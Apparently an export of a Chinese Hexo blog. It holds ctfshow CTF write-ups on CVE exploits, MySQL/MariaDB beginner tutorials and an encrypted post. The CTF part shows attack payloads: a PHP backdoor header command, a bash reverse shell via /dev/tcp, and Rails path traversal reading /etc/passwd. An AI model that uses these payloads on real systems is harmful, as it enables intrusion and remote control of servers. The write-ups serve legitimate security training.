<h1 id="WEB594"><a href="#WEB594" class="headerlink" title="WEB594"></a>WEB594</h1><p>Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。<br><a href="https://github.com/SNCKER/CVE-2021-3129/blob/master/exploit.py">EXP</a><br>运行exp还需要php，python3，linux环境，下载<a href="https://github.com/ambionics/phpggc">phpggc</a>放在同一级目录下<br>使用时只需要修改exp中的URL和命令即可<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xGi5T.png"></p>
<h1 id="WEB595"><a href="#WEB595" class="headerlink" title="WEB595"></a>WEB595</h1><p>原型为PHP官方GIT服务器近日被植入的后门。<br>首先，后门程序会检测http头是否含有User-Agentt(不是User-Agent，多了一个t)。<br>如果存在，判断它的值是否含有zerodium字符串，作为触发后门的“口令”。<br>如果标示存在，从User-Agentt值的第8个字节起到结尾提取字符串作为代码（前8个字符为zerodium），进行编译执行，如同eval函数效果。<br>抓包改报文即可执行命令：<br>User-Agentt: zerodiumsystem(‘ls &#x2F;‘);<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xJvBn.png"></p>
<h1 id="WEB596"><a href="#WEB596" class="headerlink" title="WEB596"></a>WEB596</h1><p>Python PIL 远程命令执行漏洞（GhostButt ）<br>Python中处理图片的模块PIL（Pillow），因为其内部调用了GhostScript而受到GhostButt漏洞（CVE-2017-8291）的影响，造成远程命令执行漏洞。</p>
<p>可以看到有一个上传页面。正常功能是我们上传一个PNG文件，后端调用PIL加载图片，输出长宽。但我们可以将可执行命令EPS文件后缀改成PNG进行上传，因为后端是根据文件头来判断图片类型，所以无视后缀检查。</p>
<p>比如<a href="https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png">poc.png</a>，我们上传之，即可执行touch &#x2F;tmp&#x2F;aaaaa。将POC中的命令改为反弹命令(bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1”)，即可获得shell：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/Rpnatg.png"></p>
<h1 id="WEB597"><a href="#WEB597" class="headerlink" title="WEB597"></a>WEB597</h1><p>Ruby On Rails 路径穿越漏洞（CVE-2018-3760）<br>Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。</p>
<p>Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e&#x2F;来跨越到根目录，读取或执行目标服务器上任意文件。</p>
<p>直接访问IP&#x2F;assets&#x2F;file:%2f%2f&#x2F;etc&#x2F;passwd，将会报错，因为文件&#x2F;etc&#x2F;passwd不在允许的目录中：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/RpM9k8.png"><br>在上方的报错中随意选择一个路径利用..&#x2F;返回上一级，成功实现任意文件读取<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/RpMSTf.png"></p>
<h1 id="WEB598"><a href="#WEB598" class="headerlink" title="WEB598"></a>WEB598</h1><p>Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）</p>
<p>在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入&#96;Accept: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
]]></content>
      <categories>
        <category>ctfshow-web入门</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>wp</tag>
        <tag>web入门</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（一）</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/mysql%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>centos7，mariadb5.5.56</p>
<h1 id="数据库基础操作"><a href="#数据库基础操作" class="headerlink" title="数据库基础操作"></a>数据库基础操作</h1><h2 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h2><p>默认有四个库</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc">MariaDB [(none)]&gt; show databases;<br><span class="hljs-code">+--------------------+</span><br><span class="hljs-section">| Database           |</span><br><span class="hljs-section">+--------------------+</span><br>| information<span class="hljs-emphasis">_schema |</span><br><span class="hljs-emphasis">| mysql              |</span><br><span class="hljs-emphasis">| performance_</span>schema |<br><span class="hljs-section">| test               |</span><br><span class="hljs-section">+--------------------+</span><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>aab是数据库的名字</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">MariaDB [(<span class="hljs-keyword">none</span>)]&gt; <span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> aab;<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-keyword">row</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>

<h2 id="切换（使用）数据库"><a href="#切换（使用）数据库" class="headerlink" title="切换（使用）数据库"></a>切换（使用）数据库</h2><p>切换至aab数据库</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">MariaDB</span> [(<span class="hljs-literal">none</span>)]&gt; use aab;<br><span class="hljs-attribute">Database</span> changed<br>MariaDB [aab]&gt;<br></code></pre></td></tr></table></figure>

<h2 id="删除（丢弃）数据库"><a href="#删除（丢弃）数据库" class="headerlink" title="删除（丢弃）数据库"></a>删除（丢弃）数据库</h2><p>drop database [if exists] 数据库名;<br>if exists 为可选，判断是否存在，如果不存在则会抛出异常</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">MariaDB [(<span class="hljs-keyword">none</span>)]&gt; <span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">exists</span> aab;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>

<h1 id="表基础操作"><a href="#表基础操作" class="headerlink" title="表基础操作"></a>表基础操作</h1><h2 id="查看表"><a href="#查看表" class="headerlink" title="查看表"></a>查看表</h2><p>因为目前还没有表，所以返回了empty set</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">MariaDB [aab]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> tables;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>

<h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><p>create table 表格名(列名1 类型，列名2 类型，列名3 类型);</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">MariaDB [aab]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> bba(Sid <span class="hljs-type">int</span>,Sname <span class="hljs-type">char</span>(<span class="hljs-number">6</span>),Sdate <span class="hljs-type">date</span>);<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>
<p>扩展—常用数据类型</p>
<blockquote>
<p>整数型：tinyint, smallint, mediumint, int, bigint<br>小数型：float, double, decimal, real<br>字符型：char, varchar<br>日期时间型： date, datetime, time, timestamp, year<br>备注型：tinytext, text, mediumtext, longtext</p>
</blockquote>
<p>扩展—char与varchar的区别</p>
<blockquote>
<p>首先明确的是，char的长度是不可变的，而varchar的长度是可变的，定义一个char[10]和varchar[10],如果存进去的是‘abcd’,那么char所占的长度依然为10，除了字符‘abcd’外，后面跟六个空格，而varchar就立马把长度变为4了，取数据的时候，char类型的要用trim()去掉多余的空格，而varchar是不需要的。</p>
</blockquote>
<blockquote>
<p>char的存取数度还是要比varchar要快得多，因为其长度固定，方便程序的存储与查找；但是char也为此付出的是空间的代价，因为其长度固定，所以难免会有多余的空格占位符占据空间，可谓是以空间换取时间效率，而varchar是以空间效率为首位的。char的存储方式是，对英文字符（ASCII）占用1个字节，对一个汉字占用两个字节；而varchar的存储方式是，对每个英文字符占用2个字节，汉字也占用2个字节，两者的存储数据都非unicode的字符数据。</p>
</blockquote>
<h2 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h2><p>show columns from 表名;</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">MariaDB [aab]&gt; show columns from bba;<br>+-------+---------+------+-----+---------+-------+<br>|<span class="hljs-string"> Field </span>|<span class="hljs-string"> Type    </span>|<span class="hljs-string"> Null </span>|<span class="hljs-string"> Key </span>|<span class="hljs-string"> Default </span>|<span class="hljs-string"> Extra </span>|<br>+-------+---------+------+-----+---------+-------+<br>|<span class="hljs-string"> Sid   </span>|<span class="hljs-string"> int(11) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> Sname </span>|<span class="hljs-string"> char(6) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> Sdate </span>|<span class="hljs-string"> date    </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>+-------+---------+------+-----+---------+-------+<br>3 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<h2 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h2><p>drop table [if exists] 表名;<br>if exists 为可选，判断是否存在，如果不存在则会抛出异常</p>
<blockquote>
<p>注意：删除具有主外键关系的表时，要先删子表(从表)，后删主表</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">MariaDB [aab]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> bba;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（三）</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/mysql%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%EF%BC%88%E4%B8%89%EF%BC%89.html</url>
    <content><![CDATA[<h1 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h1><figure class="highlight lasso"><table><tr><td class="code"><pre><code class="hljs lasso">INSERT <span class="hljs-keyword">INTO</span> table_name ( field1, field2,<span class="hljs-params">...</span>fieldN ) VALUES ( value1, value2,<span class="hljs-params">...</span>valueN );<br></code></pre></td></tr></table></figure>
<blockquote>
<p>如果数据是字符型，必须使用单引号或者双引号，如：”value”。</p>
</blockquote>
<h1 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h1><p>删除<code>ttt</code>表中<code>id</code>等于<code>1</code>的数据</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">delete <span class="hljs-keyword">from</span> ttt <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>

<h1 id="插入字段"><a href="#插入字段" class="headerlink" title="插入字段"></a>插入字段</h1><blockquote>
<p>alter table [表格名] Add column [要添加的字段] [字段类型] AFTER [哪个字段后面加];</p>
</blockquote>
<p>在<code>Password</code>后插入一个<code>char(8)</code>类型的<code>host</code>字段<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql3-1.jpg"></p>
<h2 id="插入字段并判断有效值"><a href="#插入字段并判断有效值" class="headerlink" title="插入字段并判断有效值"></a>插入字段并判断有效值</h2><blockquote>
<p>CHECK约束就是当向表中插入一行或更新一行数据时进行CHECK约束检查，CHECK接受一个表达式，如果这个表达式为TRUE则允许插入，如果这个表达式为FALSE则拒绝插入，在MariaDB10.2版本才开始支持CHECK。</p>
</blockquote>
<blockquote>
<p>alter table [表格名] add [要添加的字段] [字段类型] [check约束] after [哪个字段后面加];</p>
</blockquote>
<p>要满足条件age&#x3D;21或22才允许插入<br><code>alter table userinfo add age int check(age=21 or age=22) after name;</code></p>
<h1 id="删除字段"><a href="#删除字段" class="headerlink" title="删除字段"></a>删除字段</h1><blockquote>
<p>alter table [表格名] drop column [要删除的字段名];</p>
</blockquote>
<h1 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h1><blockquote>
<p>update [表格名] set [修改的内容] where [条件];</p>
</blockquote>
<h1 id="中文数据支持（修改编码格式）"><a href="#中文数据支持（修改编码格式）" class="headerlink" title="中文数据支持（修改编码格式）"></a>中文数据支持（修改编码格式）</h1><p>正常插入一条中文数据会显示不出来，因为默认编码是latin1<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/mysql3-2.jpg"></p>
<p>查看数据库默认编码<br><code>show variables like &#39;char%&#39;;</code></p>
<p>查看指定数据库默认编码<br><code>show create database [数据库];</code></p>
<p>创建数据库指定字符集<br><code>create database [数据库名称] character set utf8;</code></p>
<p>创建表指定字符集<br><code>create table [表名和字段] charset=utf8; </code></p>
<h1 id="导入导出库和表"><a href="#导入导出库和表" class="headerlink" title="导入导出库和表"></a>导入导出库和表</h1><h2 id="导出数据库和表"><a href="#导出数据库和表" class="headerlink" title="导出数据库和表"></a>导出数据库和表</h2><p>导出<code>aaa</code>库，以<code>aaa.sql</code>为文件名保存</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm">mysqldump -u root -p123 <span class="hljs-keyword">aaa</span> &gt; <span class="hljs-keyword">aaa</span><span class="hljs-number">.</span>sql<br></code></pre></td></tr></table></figure>

<p>导出<code>aaa.ttt</code>表，以<code>ttt.sql</code>为文件名保存</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysqldump</span> -u root -p123 aaa ttt &gt; ttt.sql<br></code></pre></td></tr></table></figure>

<h2 id="导入数据库和表"><a href="#导入数据库和表" class="headerlink" title="导入数据库和表"></a>导入数据库和表</h2><p>导入<code>aaa</code>这个数据库<br>注意要先创建一个<code>aaa</code>库</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm">mysqldump -u root -p123 <span class="hljs-keyword">aaa</span> &lt; <span class="hljs-keyword">aaa</span><span class="hljs-number">.</span>sql<br></code></pre></td></tr></table></figure>

<p>导入<code>ttt</code>表</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">MariaDB [(none)]&gt; use aaa;                      <span class="hljs-regexp">//</span>进入数据库<br>MariaDB [aaa]&gt; source <span class="hljs-regexp">/root/</span>ttt.sql           <span class="hljs-regexp">//</span>导入sql<br></code></pre></td></tr></table></figure>
<h2 id="导入txt"><a href="#导入txt" class="headerlink" title="导入txt"></a>导入txt</h2><p>表结构</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">MariaDB [test]&gt; desc sj;<br>+----------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> Field    </span>|<span class="hljs-string"> Type        </span>|<span class="hljs-string"> Null </span>|<span class="hljs-string"> Key </span>|<span class="hljs-string"> Default </span>|<span class="hljs-string"> Extra </span>|<br>+----------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> ID       </span>|<span class="hljs-string"> int(11)     </span>|<span class="hljs-string"> NO   </span>|<span class="hljs-string"> PRI </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> Name     </span>|<span class="hljs-string"> varchar(10) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> Day      </span>|<span class="hljs-string"> date        </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> Password </span>|<span class="hljs-string"> varchar(16) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>+----------+-------------+------+-----+---------+-------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<p>sql.txt内容</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit">[root@localhost ~]# cat sql.txt<br>3,张三,2000<span class="hljs-string">-01</span><span class="hljs-string">-02</span>,zhangsan<br>4,李四,2001<span class="hljs-string">-06</span><span class="hljs-string">-15</span>,123456<br></code></pre></td></tr></table></figure>

<p>表中已有内容</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc">MariaDB [test]&gt; select * from sj;<br><span class="hljs-code">+----+</span>--------<span class="hljs-code">+------------+</span>------------------+<br><span class="hljs-section">| ID | Name   | Day        | Password         |</span><br><span class="hljs-section">+----+--------+------------+------------------+</span><br>|  1 | w      | 1999-11-07 | f1290186a5d0b1ce |<br><span class="hljs-section">|  2 | 二哈   | 1996-12-01 | 49973c3a8ab362ad |</span><br><span class="hljs-section">+----+--------+------------+------------------+</span><br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<p>导入txt</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">MariaDB [test]&gt; <span class="hljs-keyword">load</span> data <span class="hljs-keyword">local</span> infile <span class="hljs-string">&#x27;/root/sql.txt&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> sj fields terminated <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;,&#x27;</span>(ID,<span class="hljs-type">Name</span>,Day,@p) <span class="hljs-keyword">set</span> <span class="hljs-keyword">Password</span>=md5(@p);<br>Query OK, <span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> affected, <span class="hljs-number">2</span> warnings (<span class="hljs-number">0.00</span> sec)<br>Records: <span class="hljs-number">2</span>  Deleted: <span class="hljs-number">0</span>  Skipped: <span class="hljs-number">0</span>  Warnings: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">MariaDB [test]&gt; select <span class="hljs-symbol">*</span> from sj;<br>+----+--------+------------+------------------+<br>|<span class="hljs-string"> ID </span>|<span class="hljs-string"> Name   </span>|<span class="hljs-string"> Day        </span>|<span class="hljs-string"> Password         </span>|<br>+----+--------+------------+------------------+<br>|<span class="hljs-string">  1 </span>|<span class="hljs-string"> w      </span>|<span class="hljs-string"> 1999-11-07 </span>|<span class="hljs-string"> f1290186a5d0b1ce </span>|<br>|<span class="hljs-string">  2 </span>|<span class="hljs-string"> 二哈   </span>|<span class="hljs-string"> 1996-12-01 </span>|<span class="hljs-string"> 49973c3a8ab362ad </span>|<br>|<span class="hljs-string">  3 </span>|<span class="hljs-string"> 张三   </span>|<span class="hljs-string"> 2000-01-02 </span>|<span class="hljs-string"> 01d7f40760960e7b </span>|<br>|<span class="hljs-string">  4 </span>|<span class="hljs-string"> 李四   </span>|<span class="hljs-string"> 2001-06-15 </span>|<span class="hljs-string"> e10adc3949ba59ab </span>|<br>+----+--------+------------+------------------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<p>命令解释<br><code>load data local infile &#39;/root/sql.txt&#39;</code>  &#x2F;&#x2F;加载本地sql.txt文件<br><code>into table sj</code>   &#x2F;&#x2F;导入sj这个表<br><code>fields terminated by &#39;,&#39;</code>  &#x2F;&#x2F;指明txt中分割数据的符号<br><code>(ID,Name,Day,@p) set Password=md5(@p);</code>  &#x2F;&#x2F;字段名，md5(@p)表示md5加密前面定义的@p字段的内容</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web入门-税务比武</title>
    <url>/ctfshow/web%E5%85%A5%E9%97%A8/%E3%80%90ctfshow%E3%80%91web%E5%85%A5%E9%97%A8-%E7%A8%8E%E5%8A%A1%E6%AF%94%E6%AD%A6.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ea4063c5f8cc5cc15537c150a54d9958c4c407edf316ec72d87742de7a4e4c58">d53f41d2c7ee3b58c8999934d306edce22c71ecac700bd8e6517dad81c6abf70e72459f46326ae183ff28b6d524a0b6e27360baa67c19a28a84245843828581b7f9d2a69f45cab7172f5f6c6c9ce4edb0c986a2bbb1159f701e092f9ccdb1f72c2d02f3c3e18781141a567381583c3e20f1b4a7cacd939b839048919dd1402a51c11cf93663f20e1a315ad403a7516cba713eca1e1f714bec578ed504ebccf90755e1b684c2a0704343055b6110d33971432c6595b085a59f42523d0d5620f92dcb101a03cb7ce705286d7f0b69b4f1b11d55ccbb58cabd61aa12d69cee0ebb09c19213a249282e2adabfb1e395622837349208df5b7970aa0fd06f9331382694a17352139f544ef4d0e88fd92eb306360148b93b3ac157a34e6e680bf0d204c4a8bac5fabce6203c7ea88d60520966faf6579cad4d25bcb25cb7d80d2e15ff4a520b23ece852fb26538fd3848c854ced1725e3dbbf48b7c4fc91efff10e48b8a089e8a76cda47583e0d5be4f740b01c2d1c4abe473fd6f6e3bc76d337184464c1c22baa2e5492ac3172d9ed063cc8cfb8ee1b7a44536ab9e194ed144ba84da310ab4ede6a924522ab81f6c7b5fed1f87a08c2d118c8e071bc166ad30df27b7d0c300a5ffa6c49c94a7299d899029af1dba14058b5142c972ccf9852fda3b48f96ac09c465c384d8c58614c179b7fa364f676cf9b774dd57b807c4d1881471f6227ad4791ecb1b872c2c23744eb29b21fff676c6200837370cbc5cadd65c9890ad858b055c0a47d1fb6e46653db19e331d1d15b42930ad701f2582ae9a97187464cd728e4ffdf2facb5cff038065ab042405f1a8a591675ff2e6ce515f3fd5c77c810ad3545afd95aa1d016e996e09cbb4dfd42b38629fdb4bbac5ba37ab57b748d78a629ca9cca0cbb9baa788939861b9c137a1a175026f199265cb723554c9ca68cee980528747a074bde22ddc0b50300849c699fd246278a42c611b75d26e5acc39d7b04a1d995922969ab03ac4b165e0b4286d07957fcc63fac09a6eb5d3502df67b2563975d8df5d3f9fa34f6c3f8b14cbace81cf7e724efa516e9cf355b12ac8a9e86b0a83542216373c0c40f8e38e7e3132f1b732429bd0039899babd35f9b565bd91c2ec7927e2b20206d0a2de4e283fc34f0e724b82d0cb8223ea8262e13dd7cdb275a0d98916689f6cd9a7595ad5c0acb585ea501e57f831213c5f2b1b42dd23b320af2992749664286d542cdb577b33a1f6e25ad1a32d5185c411201d0f3e369ebe79ae51d6c8592579833ae373c9111cc6943e57ef0d0d4e09c89f1d3172da9684dd6774ac9c754b7122b1e19e7917a0d34b6b20a8d1e0fd39ead340bfc0c3d048dad6612f70edbcad836a7d93f5850b9029d3462f822b10d8b1f44ac2bf70c371d23cdf1ac71c5ccff5edfc07481bd61c0d9a27c3c8e8350a91d4b5fee1bcdcd4a964f9a4ae2daec51dfef494137f799a103baed9a40bc46e3dc82ec8179d5f147cc8924271e2e58aa38c4f063d25fc921c2c4fd2654acc69e611e006d237f9e3c2f89f2d2ccbbbef1162eb18bd292b5f5c94e5b7a168c6593c566f585facd6be5bcc924d96fecab780bb0292461419fd43c051bbd0b4b8eef0834bd1058c241982e67eaf72acd1d5509aa61cabd71809c8a33382d45254500888d946cbcfa632513859490643c691f76f4a816516bf675ff61fc1db4c9baf91877fcaf3c54cd9b79e61052d194c7508a298bd2588b189f3ad41ddf7cb45cb014ebcdb0e152d985017506b3c9e1be5fe573c61c2b375554fc34f14222c9cc8d890455e0ce6d5a385a02e1fbfff540b55a78877473c00b5211d02b685efa57a53f2c32501dc8d1413bbc617ae59d85a91cda042428e9fb9e20b25c200e7f035c75b31961c59209c427bd837e17099513321d1b6ff0ad3f057d730124bf1c08a9e7e964c64b1be5239ef16f4c028f7db16386928849549584df4573555627fbe34615484d6af338043f44b0840ca6345e2ec66e2562650e992a00cc8d94953dfc0fa456db288da311a1663a0961ed92bfc328c65a3db42948fc2a3ca7e40606fa1628fa18cef3f230cb3c6f7363ce3bd1464584bd79abd4642e6dfcf5415d8ef07f83eeea574560f379c08e4a11b9eca126520951f2fc9ae1402924045b2700e80cd2f70ee92ea390c5932647cde8c799a50a93419c63f2a134e5f5c8a83f702d3cf4b0208fd5854f74cc63ab4ce654000dbc0ec6278526af15d0ec3cd5ca3d23d321e815d83bbd0b967fb80aaad11c7a9026ca75cd0d9f78696be3acb03880c5a3448d4789f81a4ce7b87bc81081b10c00534675e52ecd5a9f00cabd6ffbaace17224ffce6e03ef80afa2549184fea3e3ca2b4e61265a0dc730dd2aaa50efd8abe45a3d9881e41e213c7f4cce3e091ed291ca420cbda1cf689823bfaec5791e83fabfa74e97e33ddb64b5a6c76ba63c813a02797494dbd0bf7f16485773a639d14a3528465eef90bdb232b40552fc0e366a88917bf5e703ad9e28c51c6435b2998c5530e8a32eaf93571091f3de6bb001d8ef9e4f9f283b9c72473d8bce884f6ae791af17fee2e721314a9e2a1a2deb696d079c25a41005d984b894c5f3f0fec2d720fafabc671d36e1bf824cc5b3f231546c5d34b8caad526be7ed66cc8826ca398565f5169c3a23d50383d82e2c71c49bd4f0ae90747f8aeab487e7830da0001520586432353341972cf9e2872848f0193c106dc7636ba9e49c1883cd169b7e0f88520555118210d0e46641285e9cc129620636a9537592bc7aabe2bc209ca5239547f73b58d13a983c9537adc50242286b57a8c94be0e42d2df064d887eb7bf9189bf44a6916b32409bb952aa06027732c27761b5acd3e9730aab25ec05f800065ed0e04803481f3ed81208011eb043bfd0452dedf0ee3837e3720f60d4374c3871df990a0ea70b70a031fc89759b663cfee19b48cdaf119c9a5fd5ec26606b938a00602356c893e670649be563d5ee8295ad236a3930bcbba88279697d80d3ad07d82a28773b514687da31e6266e300289e58294db04c782c874d6b34bd3c11e135124f5d81b8f5e6095f5f7c580cf4e5e6f9e8de6af40dff77490d015371c837df165030da0e19ecaeb0093b44670bdf4f4a8b0ea100967e8f5e4a5dedd9136d4ff71d0fbeafab0ca897acbca980fd6b50dfe16215419cd3bff97d459486accc3288831e35dce62b8af5965dad3b02a3d667995a91013461ca2c644e13d5bf5914c71ff49d4bf08b7027f0f70c15e891f158f010fc4b548dbcfc0bcc8f27917457cd5bb1d4c7f0b93551340a232d1a291afaf2126e86d34997faa12417e55d777cf84aff2baf4955ba2f6278086a8ff91b0d271efa102291988cfe5333264cf18dd1b352e813eeeaedc4eb5ecc26e02801f927dc62d7225c639f1ed537594a50a454a027005ffdfec0f6c4c610e06acd7c3135747fe1a14e8036568ce97a485d8e436d734260dcbdccdc17d15d2fa9c49bc17507a3d4602e96c57abbdfa1e7a33e2bad7f804c62f7e8b5d1553f1ec168978f9ac7530ba5ceb604d6df8be4ebaf42af50a13438b26f93d583b0a57a34d4db1deaada11aac3c46a54400df916995817985ec177db48b0f07c1b19815e3880d8e2214781843fbe0f765d429efddc6f48334643abe363f5fd83c483913821bdd32d144243813c317df3e93be06106bf46e4031e9c25d74d3bb57c2acf14acba2e3b0000fd2fcafdfccced8240ab5a90fa02e1dbaf9b56dd6e2d53ee925ed8d47fdea2d88e5e430fccb00f63a431399d6d3b1598753f63bacb20e14365ed92e18a075bad2a044ed58f511c7f58fe59b284aa81695bebaa0556dd01577a119a34c52a05729ccd7f4059960536c8a94e80bff6c60e0b062902769b14548fd16a7c64b22ae2c01f31455d6641cf73aa090689bd2092d719278a080075b1449eff2780c8bc846a4f5c44e25df2e1d8374a6b43d05a362b1df7ec9393e76b37434aede0d6bc7b1365bb4215891d57893b8d5274d0ba004d57664260bef44d0040bec979959db2bbdedc9d48dd9db104676908c72704bd3f92565a8abc8f0ca540748bee85decf5ebf216f3a331938ba11b72b1ab72cacfcf9629f5d87535bf5eb5fd9a24f1ffac64c062f7899b64589dfcf562ea18f240616385a2fc43eba9c3ad4a850483a4a2e56dc3e88451b13b734ad171715b0882b450c5a769502046baf7525d686e886ab292b47a6af784bafb0c19ea482bafa0ec700a60209a4941920cb293206aa2810a01d08478969fc75752d874693ca368fdcadfd0c5a43e12769e6cd6f4be07bf9ce53f81a682b6b6fff782fb5c437308a7b260c40c6b0a275b047c35c8ffb6740f9e8e38e604a38f44167315e3f5dfba8a31144c696c29bf7d44ccbdfeed2f4eac25f55e7963ea7241ccacfed38d191eafd8d2a4c715ded30c12e53048c72247a695102be0dfbe275236c63af71c0da9b03afd39074bf902234ec7409d915a5428805e258ee334688021e9d8772ea090d03dc72b493fe13c8345f106b26c01a422e988b55ffd9849740188eb913d570018bb723d135ffd5899486fbc1f260fef